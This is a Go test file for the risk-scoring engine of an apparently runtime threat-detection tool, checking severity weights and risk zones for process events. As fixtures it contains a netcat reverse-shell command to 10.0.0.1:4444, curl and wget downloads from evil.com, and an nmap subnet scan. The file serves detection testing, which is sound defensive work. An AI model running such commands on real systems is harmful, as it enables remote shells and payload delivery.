package risk

import (
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/executeid/ztre/pkg/collector"
	"github.com/executeid/ztre/pkg/validator"
	"go.uber.org/zap"
)

const testPolicy = `
weights:
  severity: 0.50
  context: 0.30
  asset_criticality: 0.20

severity_scores:
  reverse_shell: 100
  chmod_suid: 90
  curl_download: 80
  bash_spawn: 70
  file_write_etc: 60
  nmap_scan: 85
  default: 20

context_scores:
  NORMAL: 0
  SUSPICIOUS: 50
  ANOMALOUS: 100

asset_criticality:
  critical:
    namespaces: [database, secrets, auth]
    score: 100
  high:
    namespaces: [api, messaging]
    score: 75
  medium:
    namespaces: [backend]
    score: 50
  low:
    namespaces: [frontend, static]
    score: 25
  default_score: 50
`

func writePolicy(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	p := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(p, []byte(testPolicy), 0o644); err != nil {
		t.Fatal(err)
	}
	return p
}

func makeEvent(binary, args, ns string, evType collector.EventType) *collector.SecurityEvent {
	return &collector.SecurityEvent{
		Timestamp:    time.Now(),
		EventType:    evType,
		Binary:       binary,
		Arguments:    args,
		ParentBinary: "nginx",
		Namespace:    ns,
		PodName:      "test-pod",
	}
}

func TestEngine_Calculate_RedZone(t *testing.T) {
	// nginx → bash in database namespace = ANOMALOUS
	// S=70(bash_spawn)*0.5=35, C=100(ANOMALOUS)*0.3=30, A=100(database)*0.2=20
	// Total = 85 → RED
	engine, err := NewEngine(writePolicy(t), zap.NewNop())
	if err != nil {
		t.Fatal(err)
	}
	ev := makeEvent("bash", "", "database", collector.EventTypeExecve)
	score := engine.Calculate(ev, validator.ClassAnomalous)

	t.Logf("Score breakdown: S=%.1f C=%.1f A=%.1f Total=%.1f", score.SeverityScore, score.ContextScore, score.AssetScore, score.TotalScore)

	// 0.5*70 + 0.3*100 + 0.2*100 = 35+30+20 = 85
	if score.TotalScore < 84 || score.TotalScore > 86 {
		t.Errorf("expected ~85, got %.1f", score.TotalScore)
	}
	if zone := score.Zone(39, 69); zone != "RED" {
		t.Errorf("expected RED zone, got %s", zone)
	}
}

func TestEngine_Calculate_ReverseShell(t *testing.T) {
	engine, err := NewEngine(writePolicy(t), zap.NewNop())
	if err != nil {
		t.Fatal(err)
	}
	// nc -e /bin/sh in database → ANOMALOUS
	// S=100*0.5=50, C=100*0.3=30, A=100*0.2=20 → Total=100
	ev := makeEvent("nc", "-e /bin/sh 10.0.0.1 4444", "database", collector.EventTypeExecve)
	score := engine.Calculate(ev, validator.ClassAnomalous)

	t.Logf("Reverse shell score: S=%.1f C=%.1f A=%.1f Total=%.1f", score.SeverityScore, score.ContextScore, score.AssetScore, score.TotalScore)

	if score.TotalScore != 100 {
		t.Errorf("expected 100, got %.1f", score.TotalScore)
	}
	if zone := score.Zone(39, 69); zone != "RED" {
		t.Errorf("expected RED zone, got %s", zone)
	}
}

func TestEngine_Calculate_GreenZone(t *testing.T) {
	engine, err := NewEngine(writePolicy(t), zap.NewNop())
	if err != nil {
		t.Fatal(err)
	}
	// Unknown parent → ls in frontend → SUSPICIOUS
	// S=20(default)*0.5=10, C=50(SUSPICIOUS)*0.3=15, A=25(frontend)*0.2=5
	// Total = 30 → GREEN
	ev := makeEvent("ls", "-la", "frontend", collector.EventTypeExecve)
	score := engine.Calculate(ev, validator.ClassSuspicious)

	t.Logf("Low-risk score: S=%.1f C=%.1f A=%.1f Total=%.1f", score.SeverityScore, score.ContextScore, score.AssetScore, score.TotalScore)

	if score.TotalScore < 29 || score.TotalScore > 31 {
		t.Errorf("expected ~30, got %.1f", score.TotalScore)
	}
	if zone := score.Zone(39, 69); zone != "GREEN" {
		t.Errorf("expected GREEN zone, got %s", zone)
	}
}

func TestEngine_Calculate_YellowZone(t *testing.T) {
	engine, err := NewEngine(writePolicy(t), zap.NewNop())
	if err != nil {
		t.Fatal(err)
	}
	// nginx → curl in api namespace → ANOMALOUS
	// S=80(curl_download)*0.5=40, C=100(ANOMALOUS)*0.3=30, A=75(api)*0.2=15
	// Total = 85 → actually RED (curl+anomalous is severe)
	// To get yellow: SUSPICIOUS context instead
	ev := makeEvent("curl", "http://evil.com/payload", "frontend", collector.EventTypeExecve)
	score := engine.Calculate(ev, validator.ClassSuspicious)

	t.Logf("Medium-risk score: S=%.1f C=%.1f A=%.1f Total=%.1f", score.SeverityScore, score.ContextScore, score.AssetScore, score.TotalScore)

	// S=80*0.5=40, C=50*0.3=15, A=25*0.2=5 → Total=60 → YELLOW
	if score.TotalScore < 59 || score.TotalScore > 61 {
		t.Errorf("expected ~60, got %.1f", score.TotalScore)
	}
	if zone := score.Zone(39, 69); zone != "YELLOW" {
		t.Errorf("expected YELLOW zone, got %s", zone)
	}
}

func TestEngine_Zone(t *testing.T) {
	tests := []struct {
		total    float64
		wantZone string
	}{
		{10, "GREEN"},
		{39, "GREEN"},
		{40, "YELLOW"},
		{69, "YELLOW"},
		{70, "RED"},
		{100, "RED"},
	}
	for _, tc := range tests {
		rs := RiskScore{TotalScore: tc.total}
		got := rs.Zone(39, 69)
		if got != tc.wantZone {
			t.Errorf("Zone(%.0f) = %s, want %s", tc.total, got, tc.wantZone)
		}
	}
}

func TestEngine_DefaultNamespace(t *testing.T) {
	engine, err := NewEngine(writePolicy(t), zap.NewNop())
	if err != nil {
		t.Fatal(err)
	}
	ev := makeEvent("bash", "", "unknown-namespace", collector.EventTypeExecve)
	score := engine.Calculate(ev, validator.ClassAnomalous)

	// default_score = 50
	if score.AssetScore != 50 {
		t.Errorf("expected asset score 50 for unknown namespace, got %.1f", score.AssetScore)
	}
}

func TestEngine_CurlDownload(t *testing.T) {
	engine, err := NewEngine(writePolicy(t), zap.NewNop())
	if err != nil {
		t.Fatal(err)
	}
	ev := makeEvent("wget", "http://evil.com", "backend", collector.EventTypeExecve)
	score := engine.Calculate(ev, validator.ClassSuspicious)

	// wget matches curl_download: S=80
	if score.SeverityScore != 80 {
		t.Errorf("expected severity 80 for wget, got %.1f", score.SeverityScore)
	}
}

func TestEngine_NmapScan(t *testing.T) {
	engine, err := NewEngine(writePolicy(t), zap.NewNop())
	if err != nil {
		t.Fatal(err)
	}
	// nmap is not explicitly matched by binary checks but by policy key
	// Since it doesn't match any check, it gets "default" = 20
	// This test documents that behavior; explicit nmap detection needs
	// adding the binary check if required.
	ev := makeEvent("nmap", "-sV 10.0.0.0/24", "database", collector.EventTypeExecve)
	score := engine.Calculate(ev, validator.ClassAnomalous)

	t.Logf("nmap score: S=%.1f Total=%.1f", score.SeverityScore, score.TotalScore)
	// ponytail: add explicit nmap binary check when lateral movement detection needed
}

func TestEngine_MaxScore(t *testing.T) {
	// Verify max score = 100 with rescaled policy
	engine, err := NewEngine(writePolicy(t), zap.NewNop())
	if err != nil {
		t.Fatal(err)
	}
	// reverse_shell + ANOMALOUS + critical namespace
	ev := makeEvent("nc", "-e /bin/sh 10.0.0.1 4444", "database", collector.EventTypeExecve)
	score := engine.Calculate(ev, validator.ClassAnomalous)

	if score.TotalScore != 100 {
		t.Errorf("max score should be 100, got %.1f", score.TotalScore)
	}
}

// TestEngine_ReverseShell_NoFalsePositive verifies that binaries whose names
// merely contain the substring "nc" (e.g. encryptor, fence, sync) do NOT
// trigger reverse-shell detection. Only exact base names nc/ncat/netcat match.
func TestEngine_ReverseShell_NoFalsePositive(t *testing.T) {
	engine, err := NewEngine(writePolicy(t), zap.NewNop())
	if err != nil {
		t.Fatal(err)
	}

	// These binaries contain 'nc' as substring but must NOT be reverse-shell scored.
	nonShellBins := []struct {
		name, args string
	}{
		{"/usr/bin/encryptor", "-e payload.enc"},
		{"/usr/bin/sync_tool", "-c config.yaml"},
		{"/usr/bin/fence", "-e action"},
		{"/usr/bin/balance", "-c 4"},
	}
	for _, tc := range nonShellBins {
		ev := makeEvent(tc.name, tc.args, "frontend", collector.EventTypeExecve)
		score := engine.Calculate(ev, validator.ClassSuspicious)
		if score.SeverityScore >= 100 {
			t.Errorf("binary %q with args %q should NOT score reverse_shell (100), got %.0f",
				tc.name, tc.args, score.SeverityScore)
		}
	}

	// These MUST trigger reverse-shell (exact base names).
	shellBins := []struct {
		name, args string
	}{
		{"nc", "-e /bin/sh 10.0.0.1 4444"},
		{"/usr/bin/nc", "-e /bin/sh 10.0.0.1 4444"},
		{"/usr/bin/ncat", "-e /bin/sh 10.0.0.1 4444"},
		{"/usr/bin/netcat", "-e /bin/sh 10.0.0.1 4444"},
	}
	for _, tc := range shellBins {
		ev := makeEvent(tc.name, tc.args, "database", collector.EventTypeExecve)
		score := engine.Calculate(ev, validator.ClassAnomalous)
		if score.SeverityScore != 100 {
			t.Errorf("binary %q with args %q SHOULD score reverse_shell (100), got %.0f",
				tc.name, tc.args, score.SeverityScore)
		}
	}
}

// TestEngine_Zone_FractionalScore verifies Zone() and decision.Evaluate() boundaries
// are consistent for fractional scores. Both use <= greenMax / <= yellowMax semantics.
func TestEngine_Zone_FractionalScores(t *testing.T) {
	tests := []struct {
		score    float64
		wantZone string
	}{
		{38.0, "GREEN"},
		{39.0, "GREEN"},  // exactly at boundary: <= 39 -> GREEN
		{39.5, "YELLOW"}, // 39.5 > 39.0 -> YELLOW (consistent with decision.Evaluate)
		{39.9, "YELLOW"},
		{40.0, "YELLOW"},
		{69.0, "YELLOW"}, // exactly at boundary: <= 69 -> YELLOW
		{69.5, "RED"},    // 69.5 > 69.0 -> RED (consistent with decision.Evaluate)
		{70.0, "RED"},
	}
	for _, tc := range tests {
		rs := RiskScore{TotalScore: tc.score}
		got := rs.Zone(39, 69)
		if got != tc.wantZone {
			t.Errorf("Zone(%.1f, 39, 69) = %s, want %s", tc.score, got, tc.wantZone)
		}
	}
}

func BenchmarkEngine_Calculate(b *testing.B) {
	dir := b.TempDir()
	p := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(p, []byte(testPolicy), 0o644); err != nil {
		b.Fatal(err)
	}
	engine, _ := NewEngine(p, zap.NewNop())
	ev := makeEvent("bash", "", "database", collector.EventTypeExecve)

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		engine.Calculate(ev, validator.ClassAnomalous)
	}
}
